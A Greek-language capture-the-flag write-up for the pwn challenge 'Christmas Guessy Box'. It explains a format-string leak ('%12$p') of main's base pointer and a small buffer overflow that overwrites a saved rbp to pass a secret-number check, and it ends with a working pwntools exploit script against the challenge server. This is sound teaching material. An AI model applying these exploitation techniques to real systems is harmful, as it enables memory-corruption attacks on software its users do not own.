**Title**: &emsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Christmas Guessy Box\
\
**Description**:&nbsp;&nbsp;&nbsp;&nbsp;Every CTF must have a good guessy challenge after all... So pip install luck and may THE luckiest get the flag!!\
\
**Author**:&emsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &nbsp;N0_Sp3c14l_Ch4r
\
\
Αρχικά ελέγχουμε τα mitigations του εκτελέσιμου.\
\
![image](https://github.com/Babafaba/NTUA_H4CK_crypto_challs/assets/56980206/a68c824a-5238-4279-bbf5-f69cdf5b9311)\
\
Παρατηρούμε πως έχει Partial RELRO, NX και PIE enabled. Ωστόσο, δε θα χρειαστεί να ασχοληθούμε με αυτά στη συνέχεια.\

# Σχετικά με το challenge:
Ανοίγοντας το binary σε κάποιον decompiler (let's say Ghidra) παρατηρούμε τα εξής:
* Αρχικά το εκτελέσιμο δημιουργεί ένα seed για την `srand()`, αξιοποιώντας την τυχαιότητα του `/dev/urandom`
* Στη συνέχεια, με βάση αυτό το seed, δημιουργεί δύο τυχαίους αριθμούς μέσω της `rand()`, έστω τους `rand_1` και `rand_2`
* Αποθηκεύει στο global variable `secret_number` την τιμή `rand_1` * $256^{3}$ + `rand_2` δημιουργώντας έτσι έναν 8byte unsigned long. Στο σημείο αυτό σημειώνουμε πως την τιμή αυτή την αποθηκεύει και σε μία τοπική μεταβλητή της `main()`, δηλαδή αυτή η τιμή βρίσκεται και στο stack frame της `main()` (θα μας χρειαστεί παρακάτω)

Κατόπιν καλείται η συνάρτηση `game()`, στην οποία συμβαίνουν τα εξής:
* Αρχικά ζητείται από τον χρήστη να πλκτρολογήσει το όνομά του. Προσοχή πως αποθηκεύονται έως `14` χαρακτήρες. Ακόμη, το παρόν βήμα συμβαίνει μόνο στην πρώτη προσπάθεια.
* Ακολούθως ζητείται από τον χρήστη να πληκτρολογήσει έναν αριθμό (έως 10 ψηφίων), τον οποίον το πρόγραμμα μετατρέπει σε `unsigned long` μέσω της `strtol()`
* Εφόσον δεν προκύψει κάποιο σφάλμα κατά την κλήση της `strtol()`, καλείται η συνάρτηση `opinion()`, στην οποία ο χρήστης μπορεί να γράψει τη γνώμη του για τα μελομακάρονα <3
* Αφού επιστρέψει η `opinion()`, τυώνεται στο `stdout` ο αριθμός που έδωσε προηγουμένως ο χρήστης και έπειτα συγκρίνεται με την τιμή που είχε αποθηκευτεί κατά την έναρξη της `main()` στη μεταβλητή `secret_number`
* Αν οι δύο τιμές είναι ίσες, τότε εκτελείται η `win()` και τυπώνεται στο `stdout` το **flag**. Διαφορετικά η `game()` επιστρέφει και η εκτέλεση συνεχίζεται στη `main()`

Σε περίπτωση που ο χρήστης δεν μπόρεσε να μαντέψει το `secret_number`, το πρόγραμμα του δίνει ακόμα μία ευκαιρία στην οποία επαναλαμβάνονται όλα τα παραπάνω βήματα, τόσο της `main()`, όσο και της `game()`.

# Vulnerabilities:
Με βάση τα παραπάνω, γρήγορα καταλαβαίνουμε πως είναι μάλλον απίθανο να μπορέσουμε να μαντέψουμε τον τυχαίο αριθμό που παράγεται κατά την έναρξη. Κοιτάμε συνεπώς για πιθανές ευπάθειες που περίεχονται στο εκτελέσιμο. Γενικά αυτές είναι `2` και είναι σχετικά εύκολο να της εντοπίσουμε.
* Στη συνάρτηση `opinion()` υπάρχει **buffer overflow** καθώς ο πίνακας `local_48`, αν και χωράει `64` χαρακτήρες, το πρόγραμμα διαβάζει έως και `71` από το `stdin`. Παρατηρούμε πως οι έξτρα χαρακτήρες που μπορούμε να τοποθετήσουμε στο stack, δε φτάνουν προκειμένου να κάνουμε overwrite το return address της `opinion()`. Μπορούμε ωστόσο να κάνουμε overwrite την τιμή του base pointer.\
![image](https://github.com/Babafaba/NTUA_H4CK_crypto_challs/assets/56980206/fb60f1bd-6687-461a-a95d-9c164f419e70)
* Στη συνάρτηση `game()` υπάρχει ξεκάθαρο **format string vulnerability**, καθώς τα περιεχόμενα του buffer (char local_2a) που περιέχει τους χαρακτήρες του αριθμού που δίνουμε ως είσοδο, τυπώνονται χωρίς το κατάλληλο format specifier.\
![image](https://github.com/Babafaba/NTUA_H4CK_crypto_challs/assets/56980206/331ee7bc-75a3-4475-a52d-de0ff4250873)\
...\
...\
\
![image](https://github.com/Babafaba/NTUA_H4CK_crypto_challs/assets/56980206/af26af50-949f-41ef-92b2-2a1a110a5274)

# Exploitation:
Συνεπώς, με βάση τα παραπάνω θα πρέπει να βρούμε έναν τρόπο να περάσουμε επιτυχώς τον έλεγχο ισότητας μεταξύ του αριθμού που δίνουμε και του `secret_number` ώστε να πάρουμε το flag. Στο σημείο αυτό θυμίζουμε πως η τιμή του `secret_number` είναι αποθηκευμένη στο stack frame της `main()` και όπως σχολιάσαμε, μπορούμε να μεταβάλλουμε τον base pointer της συνάρτησης `opinion()`. **Hmmm...**\
Αν γνωρίζαμε την τιμή του base pointer της `main()`, τότε θα μπορούσαμε να κάνουμε overwrite τον base pointer της `opinion()`, δίνοντάς του κατάλληλη τιμή ώστε κατά τον έλεγχο, το offset από τον **rbp** της μεταβλητής που περιέχει το guess του χρήστη, να ταυτίζεται με το offset του base pointer της `main()` από την τοπική μεταβλητή της που περιέχει την τιμή του `secret_number`.\
Για να βρούμε την τιμή του base pointer της `main()` θα χρησιμοποιήσουμε το format string vulnerability που αναφέραμε παραπάνω. Εκτελώντας σε έναν debugger της επιλογής μας το εκτελέσιμο, μπορούμε να δούμε τα κάτωθι:\
* Θέτουμε breakpoint ακριβώς πριν κλειθεί η συνάρτηση `printf()` που είναι vulnerable σε format string. Παρατηρούμε πως το stack είναι ως εξής\
![image](https://github.com/Babafaba/NTUA_H4CK_crypto_challs/assets/56980206/8b631ab7-b5aa-47c9-b48d-5f2c31b7a0c8)\
Η τιμή του rbp της `main()` μπορούμε να δούμε πως είναι η `0x7fffffffdd40` (αυτό μπορούμε να το πιστοποιήσουμε εξετάζοντας το binary στον debugger).
* Με βάση αυτό, παίζοντας με τις τιμές στο format string vulnerability, βλέπουμε πως αν δώσουμε ως είσοδο για τη μαντεψιά μας το string `%12$p`, τότε κατά την εκτέλεση της `printf()`, θα τυπωθεί στο `stdout` η τιμή του rbp της `main()`. Καταφέρνουμε έτσι να πάρουμε το leak που θέλαμε.

Μένει να βρούμε και την τιμή με την οποία πρέπει να κάνουμε overwrite τον rbp της `opinion()` προκειμένου να ταυτίζονται τα offsets. Βλέπουμε ότι:\
![image](https://github.com/Babafaba/NTUA_H4CK_crypto_challs/assets/56980206/2b055ad6-62a3-42cf-9f15-c0a88a1b8779)\
Η τιμή του `secret_number` αποθηκεύται στο stack της `main()` και συγκεκριμένα στη θέση μνήμης `rbp-0x8`, όπου rbp η τιμή του rbp της `main()`. Ακόμα:\
![image](https://github.com/Babafaba/NTUA_H4CK_crypto_challs/assets/56980206/b4ef78e0-4a2f-44a7-8e45-7c37edb837ba)\
Η τιμή δηλαδή που συγκρίνεται με το `secret_number` είναι η τιμή που περιέχεται στη θέση μνήμης `rbp-0x8`, αυτή τη φορά όμως ο rbp είναι ο base pointer της συνάρτησης `game()`.\
\
Με άλλα λόγια τα offsets είναι ίδια ανάμεσα στις δύο μεταβλητές που συγκρίνει το πρόγραμμα. Αρκεί, λοιπόν, να κάνουμε overwrite την τιμή του rbp της συνάρτησης `opinion()`, με την τιμή του rbp της συνάρτησης `main()` (την οποία γνωρίζουμε εξαιτίας του leak). Έτσι, κατά το return της `opinion()`, ο rbp θα λάβει την τιμή του rbp της `main()` και όταν έρθει η ώρα της σύγκρισης, το `rbp-0x8` θα περιέχει τη διεύθυνση μνήμης της `main()` που είναι αποθηκευμένο το `secret_number` αντί για τη διεύθυνση της μνήμης που περιέχει τη μαντεψιά-νούμερο που δίνει ως είσοδο ο χρήστης. Ακολούθως, ο έλεγχος θα είναι επιτυχής και θα λάβουμε στο `stdout` το πολυπόθητο **flag**.\
\
Συνοψίζοντας:
* Κατά την πρώτη προσπάθεια, δίνουμε ως είσοδο για τον αριθμό το string `%12$p` και διαβάζουμε το memory leak που μας επιστρέφει το binary
* Κατά τη δεύτερη προσπάθεια, κάνουμε overflow τον buffer της `opinion()` έτσι ώστε να κάνουμε overwrite τον rbp με την τιμή που λάβαμε προηγουμένως (αναφερόμαστε στο leak)
* Το flag τυπώνεται επιτέλους στο τερματικό μας καθώς εκτελείται η `win()`

# POC:
Για το exploitation, μπορεί να χρησιμοποιηθεί το ακόλουθο script σε Python:
```Python
#N0_Sp3c14l_Ch4r

from pwn import *

#Connect to remote server
r = remote('0.cloud.chals.io', 21341)

#First payload, exploiting the format string vulnerability
payload1 = b'%12$p'

#Interacting with the binary (not important, you can add your own strings)
r.sendlineafter(b'name: ', b'Chagi')
r.sendlineafter(b'number: ', payload1)
r.sendlineafter(b'here: ', b'kek')

#Reading the memory leak
r.recvuntil(b'your guess')

r.recvline()
leak = int(r.recvline().strip().decode(), 16)
print(leak)
print(hex(leak))

#Second payload, exploiting the buffer overflow and overwriting the rbp
payload2 = b'A'*64 + p64(leak)

#Interacting with the binary for the second time (again you can change the '1337' string)
r.sendlineafter(b'number: ', b'1337')

#Triggering the BOF
r.sendlineafter(b'here: ', payload2)

#Flag on the terminal!!
r.interactive()

#PWNED
```
\
Εκτελώντας το παραπάνω, λαμβάνουμε ως έξοδο:\
![image](https://github.com/Babafaba/NTUA_H4CK_crypto_challs/assets/56980206/cec1a2ba-d1d6-4f6b-93ce-c3bef19f51fc)




